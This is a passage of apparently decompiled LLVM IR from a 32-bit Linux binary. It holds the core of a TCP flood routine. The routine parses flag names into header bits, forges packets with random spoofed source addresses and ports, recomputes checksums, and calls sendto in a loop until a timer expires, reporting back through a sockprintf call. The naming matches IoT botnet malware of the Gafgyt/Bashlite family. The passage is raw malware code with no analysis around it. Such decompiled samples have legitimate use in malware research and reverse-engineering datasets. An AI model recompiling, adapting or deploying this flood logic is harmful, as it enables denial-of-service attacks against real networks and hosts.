  store i32 %v7_804ea2b, i32* @edx, align 4
  store i8 %v2_804ea2b, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804ea36:                             ; preds = %dec_label_pc_804e9f1
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059137.305 to i32), i32* @edi, align 4
  %v7_804ea54 = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059137.305, i32 0, i32 0), i32 4)
  %v8_804ea54 = urem i32 %v7_804ea54, 2
  %v9_804ea54 = icmp eq i32 %v8_804ea54, 0
  %v0_804ea56 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea56 = or i1 %v0_804ea56, %v9_804ea54
  %v3_804ea56 = zext i1 %v2_804ea56 to i32
  %v4_804ea56 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea56 = and i32 %v4_804ea56, -256
  %v6_804ea56 = or i32 %v3_804ea56, %v5_804ea56
  %v7_804ea56 = xor i32 %v6_804ea56, 1
  store i32 %v7_804ea56, i32* %edx.global-to-local, align 4
  %v3_804ea5c = and i32 %v7_804ea54, -256
  %v1_804ea5e = trunc i32 %v7_804ea56 to i8
  %v3_804ea5e = zext i1 %v0_804ea56 to i8
  %v4_804ea5e = sub nsw i8 %v1_804ea5e, %v3_804ea5e
  %v15_804ea5e = icmp eq i8 %v4_804ea5e, 0
  %v20_804ea5e = zext i8 %v4_804ea5e to i32
  %v23_804ea5e = or i32 %v20_804ea5e, %v3_804ea5c
  store i32 %v23_804ea5e, i32* @ecx, align 4
  %v2_804ea62 = sext i8 %v4_804ea5e to i32
  store i32 %v2_804ea62, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea67 = icmp eq i1 %v15_804ea5e, false
  br i1 %v1_804ea67, label %dec_label_pc_804ea7b, label %dec_label_pc_804ea69

dec_label_pc_804ea69:                             ; preds = %dec_label_pc_804ea36
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804ea6c = load i8, i8* %v2_804eb62, align 1
  %v2_804ea70 = or i8 %v3_804ea6c, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ea70 = zext i8 %v2_804ea70 to i32
  store i32 %v7_804ea70, i32* @edx, align 4
  store i8 %v2_804ea70, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804ea7b:                             ; preds = %dec_label_pc_804ea36
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805913b.306 to i32), i32* @edi, align 4
  %v7_804ea9f = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805913b.306, i32 0, i32 0), i32 4)
  %v8_804ea9f = urem i32 %v7_804ea9f, 2
  %v9_804ea9f = icmp eq i32 %v8_804ea9f, 0
  %v0_804eaa1 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eaa1 = or i1 %v0_804eaa1, %v9_804ea9f
  %v3_804eaa1 = zext i1 %v2_804eaa1 to i32
  %v4_804eaa1 = load i32, i32* %edx.global-to-local, align 4
  %v5_804eaa1 = and i32 %v4_804eaa1, -256
  %v6_804eaa1 = or i32 %v3_804eaa1, %v5_804eaa1
  %v7_804eaa1 = xor i32 %v6_804eaa1, 1
  store i32 %v7_804eaa1, i32* %edx.global-to-local, align 4
  %v3_804eaa7 = and i32 %v7_804ea9f, -256
  %v1_804eaa9 = trunc i32 %v7_804eaa1 to i8
  %v3_804eaa9 = zext i1 %v0_804eaa1 to i8
  %v4_804eaa9 = sub nsw i8 %v1_804eaa9, %v3_804eaa9
  %v15_804eaa9 = icmp eq i8 %v4_804eaa9, 0
  %v20_804eaa9 = zext i8 %v4_804eaa9 to i32
  %v23_804eaa9 = or i32 %v20_804eaa9, %v3_804eaa7
  store i32 %v23_804eaa9, i32* @ecx, align 4
  %v2_804eaad = sext i8 %v4_804eaa9 to i32
  store i32 %v2_804eaad, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eab2 = icmp eq i1 %v15_804eaa9, false
  br i1 %v1_804eab2, label %dec_label_pc_804eac6, label %dec_label_pc_804eab4

dec_label_pc_804eab4:                             ; preds = %dec_label_pc_804ea7b
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eab7 = load i8, i8* %v2_804eb62, align 1
  %v2_804eabb = or i8 %v3_804eab7, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eabb = zext i8 %v2_804eabb to i32
  store i32 %v7_804eabb, i32* @edx, align 4
  store i8 %v2_804eabb, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eac6:                             ; preds = %dec_label_pc_804ea7b
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805913f.307 to i32), i32* @edi, align 4
  %v7_804eaf6 = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805913f.307, i32 0, i32 0), i32 4)
  %v8_804eaf6 = urem i32 %v7_804eaf6, 2
  %v9_804eaf6 = icmp eq i32 %v8_804eaf6, 0
  %v0_804eaf8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eaf8 = or i1 %v0_804eaf8, %v9_804eaf6
  %v3_804eaf8 = zext i1 %v2_804eaf8 to i32
  %v4_804eaf8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804eaf8 = and i32 %v4_804eaf8, -256
  %v6_804eaf8 = or i32 %v3_804eaf8, %v5_804eaf8
  %v7_804eaf8 = xor i32 %v6_804eaf8, 1
  store i32 %v7_804eaf8, i32* %edx.global-to-local, align 4
  %v3_804eafe = and i32 %v7_804eaf6, -256
  %v1_804eb00 = trunc i32 %v7_804eaf8 to i8
  %v3_804eb00 = zext i1 %v0_804eaf8 to i8
  %v4_804eb00 = sub nsw i8 %v1_804eb00, %v3_804eb00
  %v15_804eb00 = icmp eq i8 %v4_804eb00, 0
  %v20_804eb00 = zext i8 %v4_804eb00 to i32
  %v23_804eb00 = or i32 %v20_804eb00, %v3_804eafe
  store i32 %v23_804eb00, i32* @ecx, align 4
  %v2_804eb04 = sext i8 %v4_804eb00 to i32
  store i32 %v2_804eb04, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb09 = icmp eq i1 %v15_804eb00, false
  br i1 %v1_804eb09, label %dec_label_pc_804eb1a, label %dec_label_pc_804eb0b

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804eac6
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eb0e = load i8, i8* %v2_804eb62, align 1
  %v2_804eb12 = or i8 %v3_804eb0e, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eb12 = zext i8 %v2_804eb12 to i32
  store i32 %v7_804eb12, i32* @edx, align 4
  store i8 %v2_804eb12, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb1a:                             ; preds = %dec_label_pc_804eac6
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059143.308 to i32), i32* @edi, align 4
  %v7_804eb4a = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059143.308, i32 0, i32 0), i32 4)
  %v8_804eb4a = urem i32 %v7_804eb4a, 2
  %v9_804eb4a = icmp eq i32 %v8_804eb4a, 0
  %v0_804eb4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb4c = or i1 %v0_804eb4c, %v9_804eb4a
  %v3_804eb4c = zext i1 %v2_804eb4c to i32
  %v4_804eb4c = load i32, i32* %edx.global-to-local, align 4
  %v5_804eb4c = and i32 %v4_804eb4c, -256
  %v6_804eb4c = or i32 %v3_804eb4c, %v5_804eb4c
  %v7_804eb4c = xor i32 %v6_804eb4c, 1
  store i32 %v7_804eb4c, i32* %edx.global-to-local, align 4
  %v3_804eb52 = and i32 %v7_804eb4a, -256
  %v1_804eb54 = trunc i32 %v7_804eb4c to i8
  %v3_804eb54 = zext i1 %v0_804eb4c to i8
  %v4_804eb54 = sub nsw i8 %v1_804eb54, %v3_804eb54
  %v15_804eb54 = icmp eq i8 %v4_804eb54, 0
  %v20_804eb54 = zext i8 %v4_804eb54 to i32
  %v23_804eb54 = or i32 %v20_804eb54, %v3_804eb52
  store i32 %v23_804eb54, i32* @ecx, align 4
  %v2_804eb58 = sext i8 %v4_804eb54 to i32
  store i32 %v2_804eb58, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb5d = icmp eq i1 %v15_804eb54, false
  br i1 %v1_804eb5d, label %dec_label_pc_804eb6e, label %dec_label_pc_804eb5f

dec_label_pc_804eb5f:                             ; preds = %dec_label_pc_804eb1a
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eb62 = load i8, i8* %v2_804eb62, align 1
  %v2_804eb66 = or i8 %v3_804eb62, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eb66 = zext i8 %v2_804eb66 to i32
  store i32 %v7_804eb66, i32* @edx, align 4
  store i8 %v2_804eb66, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb6e:                             ; preds = %dec_label_pc_804eb1a
  %v0_804eb6e = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804eb6e, i32* %edx.global-to-local, align 4
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  %v1_804eb77 = load i32, i32* @esp, align 4
  %v2_804eb77 = add i32 %v1_804eb77, 8
  %v3_804eb77 = inttoptr i32 %v2_804eb77 to i32*
  store i32 %v4_804e9f1, i32* %v3_804eb77, align 4
  %v0_804eb7b = load i32, i32* @esp, align 4
  %v1_804eb7b = add i32 %v0_804eb7b, 4
  %v2_804eb7b = inttoptr i32 %v1_804eb7b to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8059147.309 to i32), i32* %v2_804eb7b, align 4
  %v0_804eb83 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eb83 = load i32, i32* @esp, align 4
  %v2_804eb83 = inttoptr i32 %v1_804eb83 to i32*
  store i32 %v0_804eb83, i32* %v2_804eb83, align 4
  %v3_804eb86 = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8059143.308 to i32))
  store i32 %v3_804eb86, i32* @eax, align 4
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb5f, %dec_label_pc_804eb0b, %dec_label_pc_804eab4, %dec_label_pc_804ea69, %dec_label_pc_804ea24, %dec_label_pc_804eb6e
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059143.308, i32 0, i32 0), %dec_label_pc_804eb6e ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059143.308, i32 0, i32 0), %dec_label_pc_804eb5f ], [ %stack_var_-156.125, %dec_label_pc_804eb0b ], [ %stack_var_-156.125, %dec_label_pc_804eab4 ], [ %stack_var_-156.125, %dec_label_pc_804ea69 ], [ %stack_var_-156.125, %dec_label_pc_804ea24 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804eb6e ], [ 4, %dec_label_pc_804eb5f ], [ %stack_var_-160.126, %dec_label_pc_804eb0b ], [ %stack_var_-160.126, %dec_label_pc_804eab4 ], [ %stack_var_-160.126, %dec_label_pc_804ea69 ], [ %stack_var_-160.126, %dec_label_pc_804ea24 ]
  %v0_804eb8b = load i32, i32* @esp, align 4
  %v1_804eb8b = add i32 %v0_804eb8b, 4
  %v2_804eb8b = inttoptr i32 %v1_804eb8b to i32*
  store i32 ptrtoint (i32* @global_var_8059131.303 to i32), i32* %v2_804eb8b, align 4
  %v0_804eb93 = load i32, i32* @esp, align 4
  %v1_804eb93 = inttoptr i32 %v0_804eb93 to i32*
  store i32 0, i32* %v1_804eb93, align 4
  %v2_804eb9a = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804eb9a = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804eb9a)
  store i32 %v3_804eb9a, i32* %eax.global-to-local, align 4
  store i32 %v3_804eb9a, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eba2 = icmp eq i32 %v3_804eb9a, 0
  %v1_804eba6 = icmp eq i1 %v5_804eba2, false
  %tmp92 = inttoptr i32 %v3_804eb9a to i8*
  br i1 %v1_804eba6, label %dec_label_pc_804e9f1, label %dec_label_pc_804ebac

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804eb8b, %dec_label_pc_804e9d6, %dec_label_pc_804e995
  %v0_804ebac = phi i8* [ %v0_804ebac.pre, %dec_label_pc_804e995 ], [ %v5_804e9e9, %dec_label_pc_804e9d6 ], [ %tmp92, %dec_label_pc_804eb8b ]
  %v1_804ebac = ptrtoint i8* %v0_804ebac to i32
  %v2_804ebac = call i32 @rand_cmwc(i32 %v1_804ebac)
  %v1_804ebb1 = urem i32 %v2_804ebac, 65536
  store i32 %v1_804ebb1, i32* %edx.global-to-local, align 4
  %v1_804ebb7 = trunc i32 %v2_804ebac to i16
  %v3_804ebb7 = add i32 %v2_804e8d4, 34
  %v4_804ebb7 = inttoptr i32 %v3_804ebb7 to i16*
  store i16 %v1_804ebb7, i16* %v4_804ebb7, align 2
  %v1_804ebbe = add i32 %v2_804e8d4, 36
  %v2_804ebbe = inttoptr i32 %v1_804ebbe to i16*
  store i16 0, i16* %v2_804ebbe, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804ebc7 = add i32 %v2_804e8d4, 38
  %v2_804ebc7 = inttoptr i32 %v1_804ebc7 to i16*
  store i16 0, i16* %v2_804ebc7, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804e7a4, label %dec_label_pc_804ebe0, label %dec_label_pc_804ebd3

dec_label_pc_804ebd3:                             ; preds = %dec_label_pc_804ebac
  %v0_804ebd3 = load i8*, i8** %stack_var_-20, align 4
  %v1_804ebd3 = ptrtoint i8* %v0_804ebd3 to i32
  %v2_804ebd3 = call i32 @rand_cmwc(i32 %v1_804ebd3)
  br label %dec_label_pc_804ebf4

dec_label_pc_804ebe0:                             ; preds = %dec_label_pc_804ebac
  %v1_804ebe3 = urem i32 %arg2, 65536
  store i32 %v1_804ebe3, i32* %eax.global-to-local, align 4
  %v1_804ebe6 = load i32, i32* @esp, align 4
  %v2_804ebe6 = inttoptr i32 %v1_804ebe6 to i32*
  store i32 %v1_804ebe3, i32* %v2_804ebe6, align 4
  %v3_804ebe9 = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804ebf4

dec_label_pc_804ebf4:                             ; preds = %dec_label_pc_804ebd3, %dec_label_pc_804ebe0
  %storemerge12.in = phi i32 [ %v2_804ebd3, %dec_label_pc_804ebd3 ], [ %v3_804ebe9, %dec_label_pc_804ebe0 ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804ebf7 = sdiv i32 %sext, 65536
  store i32 %v4_804ebf7, i32* @esi, align 4
  %v3_804ebfa = add i32 %v2_804e8d4, 22
  %v4_804ebfa = inttoptr i32 %v3_804ebfa to i16*
  store i16 %storemerge, i16* %v4_804ebfa, align 2
  %v1_804ec01 = load i32, i32* @esp, align 4
  %v2_804ec01 = add i32 %v1_804ec01, 4
  %v3_804ec01 = inttoptr i32 %v2_804ec01 to i32*
  store i32 %v1_804e8ec, i32* %v3_804ec01, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec08 = load i32, i32* @esp, align 4
  %v2_804ec08 = inttoptr i32 %v1_804ec08 to i32*
  store i32 %v2_804e8d4, i32* %v2_804ec08, align 4
  %v0_804ec0b = call i32 @tcpcsum()
  %v1_804ec10 = urem i32 %v0_804ec0b, 65536
  store i32 %v1_804ec10, i32* %edx.global-to-local, align 4
  %v1_804ec16 = trunc i32 %v0_804ec0b to i16
  store i16 %v1_804ec16, i16* %v2_804ebbe, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec1d = or i32 %v2_804e8d4, 2
  %v2_804ec1d = inttoptr i32 %v1_804ec1d to i16*
  %v3_804ec1d = load i16, i16* %v2_804ec1d, align 2
  %v4_804ec1d = zext i16 %v3_804ec1d to i32
  store i32 %v4_804ec1d, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec26 = load i32, i32* @esp, align 4
  %v2_804ec26 = add i32 %v1_804ec26, 4
  %v3_804ec26 = inttoptr i32 %v2_804ec26 to i32*
  store i32 %v4_804ec1d, i32* %v3_804ec26, align 4
  %v0_804ec2a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec2a = load i32, i32* @esp, align 4
  %v2_804ec2a = inttoptr i32 %v1_804ec2a to i32*
  store i32 %v0_804ec2a, i32* %v2_804ec2a, align 4
  %v3_804ec2d = inttoptr i32 %v4_804ebf7 to i16*
  %v4_804ec2d = call i32 @csum(i16* %v3_804ec2d, i32 %v15_804e789)
  %v1_804ec32 = urem i32 %v4_804ec2d, 65536
  store i32 %v1_804ec32, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec38 = trunc i32 %v4_804ec2d to i16
  %v3_804ec38 = or i32 %v2_804e8d4, 10
  %v4_804ec38 = inttoptr i32 %v3_804ec38 to i16*
  store i16 %v1_804ec38, i16* %v4_804ec38, align 2
  %v0_804ec3c = load i32, i32* @esp, align 4
  %v1_804ec3c = inttoptr i32 %v0_804ec3c to i32*
  store i32 0, i32* %v1_804ec3c, align 4
  %v2_804ec43 = inttoptr i32 %v4_804ebf7 to i32*
  %v3_804ec43 = call i32 @__GI_time(i32* %v2_804ec43)
  %v5_804ec48 = add i32 %v3_804ec43, %arg3
  %v10_804ec48 = icmp ult i32 %v5_804ec48, %v3_804ec43
  store i1 %v10_804ec48, i1* %cf.global-to-local, align 1
  store i32 %v5_804ec48, i32* %eax.global-to-local, align 4
  %v2_804ec9f = or i32 %v2_804e8d4, 12
  %v3_804ec9f = inttoptr i32 %v2_804ec9f to i32*
  %v3_804ecad = or i32 %v2_804e8d4, 4
  %v4_804ecad = inttoptr i32 %v3_804ecad to i16*
  br label %dec_label_pc_804ec57

dec_label_pc_804ec57:                             ; preds = %dec_label_pc_804ed1b, %dec_label_pc_804ed38, %dec_label_pc_804ebf4
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804ebf4 ], [ %v4_804ed38, %dec_label_pc_804ed38 ], [ 0, %dec_label_pc_804ed1b ]
  store i32 %v2_804e8d4, i32* %edx.global-to-local, align 4
  %v0_804ec5d = load i32, i32* @esp, align 4
  %v1_804ec5d = add i32 %v0_804ec5d, 20
  %v2_804ec5d = inttoptr i32 %v1_804ec5d to i32*
  store i32 16, i32* %v2_804ec5d, align 4
  %v1_804ec65 = load i32, i32* @esp, align 4
  %v2_804ec65 = add i32 %v1_804ec65, 16
  %v3_804ec65 = inttoptr i32 %v2_804ec65 to i32*
  store i32 %v2_804e7c9, i32* %v3_804ec65, align 4
  %v0_804ec69 = load i32, i32* @esp, align 4
  %v1_804ec69 = add i32 %v0_804ec69, 12
  %v2_804ec69 = inttoptr i32 %v1_804ec69 to i32*
  store i32 0, i32* %v2_804ec69, align 4
  store i32 %v1_804e8b0, i32* @edi, align 4
  %v1_804ec74 = load i32, i32* @esp, align 4
  %v2_804ec74 = add i32 %v1_804ec74, 8
  %v3_804ec74 = inttoptr i32 %v2_804ec74 to i32*
  store i32 %v1_804e8b0, i32* %v3_804ec74, align 4
  %v0_804ec78 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec78 = load i32, i32* @esp, align 4
  %v2_804ec78 = add i32 %v1_804ec78, 4
  %v3_804ec78 = inttoptr i32 %v2_804ec78 to i32*
  store i32 %v0_804ec78, i32* %v3_804ec78, align 4
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  %v1_804ec7f = load i32, i32* @esp, align 4
  %v2_804ec7f = inttoptr i32 %v1_804ec7f to i32*
  store i32 %v4_804e811, i32* %v2_804ec7f, align 4
  %v1_804ec82 = load i32, i32* %stack_var_-64, align 4
  %v2_804ec82 = load i32, i32* %stack_var_-60, align 4
  %v3_804ec82 = load i32, i32* %stack_var_-56, align 4
  %v4_804ec82 = load i32, i32* %stack_var_-52, align 4
  %v6_804ec82 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804ec82, i32 %v2_804ec82, i32 %v3_804ec82, i32 %v4_804ec82, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804ec8a = load i32, i32* @esp, align 4
  %v2_804ec8a = inttoptr i32 %v1_804ec8a to i32*
  store i32 %storemerge10, i32* %v2_804ec8a, align 4
  %v1_804ec8d = load i32, i32* %stack_var_-64, align 4
  %v2_804ec8d = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804ec8d)
  store i32 %v2_804ec8d, i32* %eax.global-to-local, align 4
  %v1_804ec92 = load i32, i32* @esp, align 4
  %v2_804ec92 = inttoptr i32 %v1_804ec92 to i32*
  store i32 %v2_804ec8d, i32* %v2_804ec92, align 4
  %v0_804ec95 = call i32 @htonl()
  store i32 %v0_804ec95, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  store i32 %v0_804ec95, i32* %v3_804ec9f, align 4
  %v1_804eca2 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804eca7 = urem i32 %v1_804eca2, 65536
  store i32 %v1_804eca7, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecad = trunc i32 %v1_804eca2 to i16
  store i16 %v1_804ecad, i16* %v4_804ecad, align 4
  %v1_804ecb1 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804ecb1, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  store i32 %v1_804ecb1, i32* %v3_804e947, align 8
  %v1_804ecbe = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804ecc3 = urem i32 %v1_804ecbe, 65536
  store i32 %v1_804ecc3, i32* %edx.global-to-local, align 4
  %v1_804ecc9 = trunc i32 %v1_804ecbe to i16
  store i16 %v1_804ecc9, i16* %v5_804e8ef, align 4
  store i16 0, i16* %v2_804ebbe, align 4
  %v1_804ecd8 = load i32, i32* @esp, align 4
  %v2_804ecd8 = add i32 %v1_804ecd8, 4
  %v3_804ecd8 = inttoptr i32 %v2_804ecd8 to i32*
  store i32 %v1_804e8ec, i32* %v3_804ecd8, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecdf = load i32, i32* @esp, align 4
  %v2_804ecdf = inttoptr i32 %v1_804ecdf to i32*
  store i32 %v2_804e8d4, i32* %v2_804ecdf, align 4
  %v0_804ece2 = call i32 @tcpcsum()
  %v1_804ece7 = urem i32 %v0_804ece2, 65536
  store i32 %v1_804ece7, i32* %edx.global-to-local, align 4
  %v1_804eced = trunc i32 %v0_804ece2 to i16
  store i16 %v1_804eced, i16* %v2_804ebbe, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v3_804ecf4 = load i16, i16* %v2_804ec1d, align 2
  %v4_804ecf4 = zext i16 %v3_804ecf4 to i32
  store i32 %v4_804ecf4, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecfd = load i32, i32* @esp, align 4
  %v2_804ecfd = add i32 %v1_804ecfd, 4
  %v3_804ecfd = inttoptr i32 %v2_804ecfd to i32*
  store i32 %v4_804ecf4, i32* %v3_804ecfd, align 4
  %v0_804ed01 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed01 = load i32, i32* @esp, align 4
  %v2_804ed01 = inttoptr i32 %v1_804ed01 to i32*
  store i32 %v0_804ed01, i32* %v2_804ed01, align 4
  %v1_804ed04 = load i32, i32* %stack_var_-64, align 4
  %v2_804ed04 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804ed04 = call i32 @csum(i16* %v2_804ed04, i32 %v1_804ed04)
  %v1_804ed09 = urem i32 %v3_804ed04, 65536
  store i32 %v1_804ed09, i32* %edx.global-to-local, align 4
  %v1_804ed0f = trunc i32 %v3_804ed04 to i16
  store i16 %v1_804ed0f, i16* %v4_804ec38, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804ed16 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804ed16, i1* %cf.global-to-local, align 1
  %v15_804ed16 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804ed19 = icmp eq i1 %v15_804ed16, false
  br i1 %v1_804ed19, label %dec_label_pc_804ed38, label %dec_label_pc_804ed1b

dec_label_pc_804ed1b:                             ; preds = %dec_label_pc_804ec57
  %v0_804ed1b = load i32, i32* @esp, align 4
  %v1_804ed1b = inttoptr i32 %v0_804ed1b to i32*
  store i32 0, i32* %v1_804ed1b, align 4
  %v1_804ed22 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804ed22 = call i32 @__GI_time(i32* %v1_804ed22)
  store i32 %v2_804ed22, i32* %eax.global-to-local, align 4
  %v10_804ed27 = icmp ult i32 %v2_804ed22, %v5_804ec48
  store i1 %v10_804ed27, i1* %cf.global-to-local, align 1
  %v8_804ed2a = icmp sgt i32 %v2_804ed22, %v5_804ec48
  br i1 %v8_804ed2a, label %dec_label_pc_804ed40, label %dec_label_pc_804ec57

dec_label_pc_804ed38:                             ; preds = %dec_label_pc_804ec57
  %v4_804ed38 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804ec57

dec_label_pc_804ed40:                             ; preds = %dec_label_pc_804ed1b, %dec_label_pc_804e7c9, %dec_label_pc_804e86e, %dec_label_pc_804e81f
  %v0_804ed4a = phi i32 [ %v4_804e7d9, %dec_label_pc_804e7c9 ], [ %v3_804e87e, %dec_label_pc_804e86e ], [ %v3_804e82f, %dec_label_pc_804e81f ], [ %v2_804ed22, %dec_label_pc_804ed1b ]
  store i32 %v0_804e788, i32* @ebx, align 4
  store i32 %v0_804e787, i32* @esi, align 4
  ret i32 %v0_804ed4a

; uselistorder directives
  uselistorder i32 %v3_804ed04, { 1, 0 }
  uselistorder i32 %v0_804ece2, { 1, 0 }
  uselistorder i32 %v1_804ecbe, { 1, 0 }
  uselistorder i32 %v1_804eca2, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804ec48, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804ec43, { 1, 0 }
  uselistorder i32 %v4_804ec2d, { 1, 0 }
  uselistorder i32 %v0_804ec0b, { 1, 0 }
  uselistorder i32 %v4_804ebf7, { 2, 1, 0 }
  uselistorder i32 %v1_804ebe3, { 1, 0 }
  uselistorder i32 %v2_804ebac, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804eb4c, { 1, 0 }
  uselistorder i32 %v7_804eb4a, { 1, 0 }
  uselistorder i1 %v0_804eaf8, { 1, 0 }
  uselistorder i32 %v7_804eaf6, { 1, 0 }
  uselistorder i1 %v0_804eaa1, { 1, 0 }
  uselistorder i32 %v7_804ea9f, { 1, 0 }
  uselistorder i1 %v0_804ea56, { 1, 0 }
  uselistorder i32 %v7_804ea54, { 1, 0 }
  uselistorder i1 %v0_804ea11, { 1, 0 }
  uselistorder i32 %v7_804ea0f, { 1, 0 }
  uselistorder i32 %v4_804e9f1, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804eb74, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804eb62, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804e998, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e982, { 1, 0 }
  uselistorder i32 %v7_804e980, { 1, 0 }
  uselistorder i32 %v2_804e92f, { 1, 0 }
  uselistorder i32 %v1_804e8ec, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804e8d4, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804e8b0, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e8a6, { 1, 0 }
  uselistorder i32 %v4_804e811, { 1, 0, 4, 3, 2, 5, 6 }
